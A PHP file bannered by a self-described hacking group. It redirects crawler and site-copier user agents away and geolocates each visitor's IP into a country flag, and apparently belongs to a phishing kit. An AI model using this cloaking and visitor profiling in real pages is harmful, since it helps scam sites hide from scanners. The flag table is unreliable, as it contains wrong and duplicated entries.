<?php
/*
	 ======[ COPYRIGHT 2021 NICHICODEX X CYBER LION SQUAD ]======
	  _   _ _      _     _  _____          _           
	 | \ | (_)    | |   (_)/ ____|        | |          
	 |  \| |_  ___| |__  _| |     ___   __| | _____  __
	 |   ` | |/ __|  _ \| | |    / _ \ / _` |/ _ \ \/ /
	 | |\  | | (__| | | | | |___| (_) | (_| |  __/>  < 
	 |_| \_|_|\___|_| |_|_|\_____\___/ \__,_|\___/_/\_\
	
	 YT     : Bluesky Asia
	 Email  : its@nichicodex.com
	 WA     : +1 (863) 457-4976
	 WEB    : https://nichicodex.com/
	 
	 WE DO WHAT WE WANT BECAUSE WE CAN!
	 
	 ======[ COPYRIGHT 2021 NICHICODEX X CYBER LION SQUAD ]======
*/

?><?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.facebook.com/IdhamDotID');
die();
}
class detail {
function get_client_code() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}
}

$detail = new detail();
$ipp = $detail->get_client_code();
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.ipgeolocationapi.com/geolocate/$ipp");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$chresult = curl_exec($ch);
curl_close($ch);
$FizCall = json_decode($chresult, true);

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$url = 'http://ip-api.com/json/'.get_client_ip();

//MEMPROSES DATA
$ch = curl_init($url);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
$data = curl_exec($ch);
curl_close($ch);

//MENDAPATKAN DATA
$khcodes = json_decode($data, TRUE);

$countryCode = $khcodes['countryCode'];
$flags = array(
            "AC" => "🇦🇨",
            "AD" => "🇦🇩",
            "AE" => "🇦🇪",
            "AF" => "🇦🇫",
            "AG" => "🇦🇬",
            "AI" => "🇦🇮",
            "AL" => "🇦🇱",
            "AM" => "🇦🇲",
            "AO" => "🇦🇴",
            "AQ" => "🇦🇶",
            "AR" => "🇦🇷",
            "AS" => "🇦🇸",
            "AT" => "🇦🇹",
            "AU" => "🇦🇺",
            "AW" => "🇦🇼",
            "AX" => "🇦🇽",
            "AZ" => "🇦🇿",
            "BA" => "🇧🇦",
            "BB" => "🇧🇧",
            "BD" => "🇧🇩",
            "BE" => "🇧🇪",
            "BF" => "🇧🇫",
            "BG" => "🇧🇬",
            "BH" => "🇧🇭",
            "BI" => "🇧🇮",
            "BJ" => "🇧🇯",
            "BL" => "🇧🇱",
            "BM" => "🇧🇲",
            "BN" => "🇧🇳",
            "BO" => "🇧🇴",
            "BQ" => "🇧🇶",
            "BR" => "🇧🇷",
            "BS" => "🇧🇸",
            "BT" => "🇧🇹",
            "BV" => "🇧🇻",
            "BW" => "🇧🇼",
            "BY" => "🇧🇾",
            "BZ" => "🇧🇿",
            "CA" => "🇨🇦",
            "CC" => "🇨🇨",
            "CD" => "🇨🇩",
            "CF" => "🇨🇫",
            "CG" => "🇨🇬",
            "CH" => "🇨🇭",
            "CI" => "🇨🇮",
            "CK" => "🇨🇰",
            "CL" => "🇨🇱",
            "CM" => "🇨🇲",
            "CN" => "🇨🇳",
            "CO" => "🇨🇴",
            "CP" => "🇨🇵",
            "CR" => "🇨🇷",
            "CU" => "🇨🇺",
            "CV" => "🇨🇻",
            "CW" => "🇨🇼",
            "CX" => "🇨🇽",
            "CY" => "🇨🇾",
            "CZ" => "🇨🇿",
            "DE" => "🇩🇪",
            "DG" => "🇩🇬",
            "DJ" => "🇩🇯",
            "DK" => "🇩🇰",
            "DM" => "🇩🇲",
            "DO" => "🇩🇴",
            "DZ" => "🇩🇿",
            "EA" => "🇪🇦",
            "EC" => "🇪🇨",
            "EE" => "🇪🇪",
            "EG" => "🇪🇬",
            "EH" => "🇪🇭",
            "ER" => "🇪🇷",
            "ES" => "🇪🇸",
            "ET" => "🇪🇹",
            "EU" => "🇪🇺",
            "FI" => "🇫🇮",
            "FJ" => "🇫🇯",
            "FK" => "🇫🇰",
            "FM" => "🇫🇲",
            "FO" => "🇫🇴",
            "FR" => "🇫🇷",
            "GA" => "🇬🇦",
            "GB" => "🇬🇧",
            "GD" => "🇬🇩",
            "GE" => "🇬🇪",
            "GF" => "🇬🇫",
            "GG" => "🇬🇬",
            "GH" => "🇬🇭",
            "GI" => "🇬🇮",
            "GL" => "🇬🇱",
            "GM" => "🇬🇲",
            "GN" => "🇬🇳",
            "GP" => "🇬🇵",
            "GQ" => "🇬🇶",
            "GR" => "🇬🇷",
            "GS" => "🇬🇸",
            "GT" => "🇬🇹",
            "GU" => "🇬🇺",
            "GW" => "🇬🇼",
            "GY" => "🇬🇾",
            "HK" => "🇭🇰",
            "HM" => "🇭🇲",
            "HN" => "🇭🇳",
            "HR" => "🇭🇷",
            "HT" => "🇭🇹",
            "HU" => "🇭🇺",
            "IC" => "🇮🇨",
            "ID" => "🇮🇩",
            "IE" => "🇮🇪",
            "IL" => "🇮🇱",
            "IM" => "🇮🇲",
            "IN" => "🇮🇳",
            "IO" => "🇮🇴",
            "IQ" => "🇮🇶",
            "IR" => "🇮🇷",
            "IS" => "🇮🇸",
            "IT" => "🇮🇹",
            "JE" => "🇯🇪",
            "JM" => "🇯🇲",
            "JO" => "🇯🇴",
            "JP" => "🇯🇵",
            "KE" => "🇰🇪",
            "KG" => "🇰🇬",
            "KH" => "🇰🇭",
            "KI" => "🇰🇮",
            "KM" => "🇰🇲",
            "KN" => "🇰🇳",
            "KP" => "🇰🇵",
            "KR" => "🇰🇷",
            "KW" => "🇰🇼",
            "KY" => "🇰🇾",
            "KZ" => "🇰🇿",
            "LA" => "🇱🇦",
            "LB" => "🇱🇧",
            "LC" => "🇱🇨",
            "LI" => "🇱🇮",
            "LK" => "🇱🇰",
            "LR" => "🇱🇷",
            "LS" => "🇱🇸",
            "LT" => "🇱🇹",
            "LU" => "🇱🇺",
            "LV" => "🇱🇻",
            "LY" => "🇱🇾",
            "MA" => "🇲🇦",
            "MC" => "🇲🇨",
            "MD" => "🇲🇩",
            "ME" => "🇲🇪",
            "MF" => "🇲🇫",
            "MG" => "🇲🇬",
            "MH" => "🇲🇭",
            "MK" => "🇲🇰",
            "ML" => "🇲🇱",
            "MM" => "🇲🇲",
            "MN" => "🇲🇳",
            "MO" => "🇲🇴",
            "MP" => "🇲🇵",
            "MQ" => "🇲🇶",
            "MR" => "🇲🇷",
            "MS" => "🇲🇸",
            "MT" => "🇲🇹",
            "MU" => "🇲🇺",
            "MV" => "🇲🇻",
            "MW" => "🇲🇼",
            "MX" => "🇲🇽",
            "MY" => "🇲🇾",
            "MZ" => "🇲🇿",
            "NS" => "🇳🇦",
            "NC" => "🇳🇨",
            "NE" => "🇳🇪",
            "NF" => "🇳🇫",
            "NG" => "🇳🇬",
            "NI" => "🇳🇮",
            "NL" => "🇳🇱",
            "NO" => "🇳🇴",
            "NP" => "🇳🇵",
            "NR" => "🇳🇷",
            "NU" => "🇳🇺",
            "NZ" => "🇳🇿",
            "OM" => "🇴🇲",
            "PA" => "🇵🇦",
            "PE" => "🇵🇪",
            "PF" => "🇵🇫",
            "PG" => "🇵🇬",
            "PH" => "🇵🇭",
            "PK" => "🇵🇰",
            "PL" => "🇵🇱",
            "PM" => "🇵🇲",
            "PN" => "🇵🇳",
            "PR" => "🇵🇷",
            "PS" => "🇵🇸",
            "PT" => "🇵🇹",
            "PW" => "🇵🇼",
            "PY" => "🇵🇾",
            "QA" => "🇶🇦",
            "RE" => "🇷🇪",
            "RO" => "🇷🇴",
            "RU" => "🇷🇺",
            "RW" => "🇷🇼",
            "SA" => "🇸🇦",
            "SB" => "🇸🇧",
            "SC" => "🇸🇨",
            "SD" => "🇸🇩",
            "SE" => "🇸🇪",
            "SG" => "🇸🇬",
            "SH" => "🇸🇭",
            "SI" => "🇸🇮",
            "SJ" => "🇸🇯",
            "SK" => "🇸🇰",
            "SL" => "🇸🇱",
            "SM" => "🇸🇲",
            "SN" => "🇸🇳",
            "SO" => "🇸🇴",
            "SR" => "🇸🇷",
            "SS" => "🇸🇸",
            "ST" => "🇸🇹",
            "SV" => "🇸🇻",
            "SX" => "🇸🇽",
            "SY" => "🇸🇾",
            "SZ" => "🇸🇿",
            "TA" => "🇹🇦",
            "TC" => "🇹🇨",
            "TD" => "🇹🇩",
            "TF" => "🇹🇫",
            "TG" => "🇹🇬",
            "TH" => "🇹🇭",
            "TJ" => "🇹🇯",
            "TK" => "🇹🇰",
            "TL" => "🇹🇱",
            "TM" => "🇹🇲",
            "TN" => "🇹🇳",
            "TO" => "🇹🇴",
            "TR" => "🇹🇷",
            "TT" => "🇹🇹",
            "TV" => "🇹🇻",
            "TW" => "🇹🇼",
            "TZ" => "🇹🇿",
            "US" => "🇺🇦",
            "UG" => "🇺🇬",
            "UM" => "🇺🇲",
            "UN" => "🇺🇳",
            "US" => "🇺🇸",
            "UY" => "🇺🇾",
            "UZ" => "🇺🇿",
            "VA" => "🇻🇦",
            "VC" => "🇻🇨",
            "VE" => "🇻🇪",
            "VG" => "🇻🇬",
            "VI" => "🇻🇮",
            "VN" => "🇻🇳",
            "VU" => "🇻🇺",
            "WF" => "🇼🇫",
            "WS" => "🇼🇸",
            "XK" => "🇽🇰",
            "YE" => "🇾🇪",
            "YT" => "🇾🇹",
            "ZA" => "🇿🇦",
            "ZM" => "🇿🇲",
            "ZW" => "🇿🇼"
        );
    
        $resultFlags = $flags[$countryCode];

?>
?>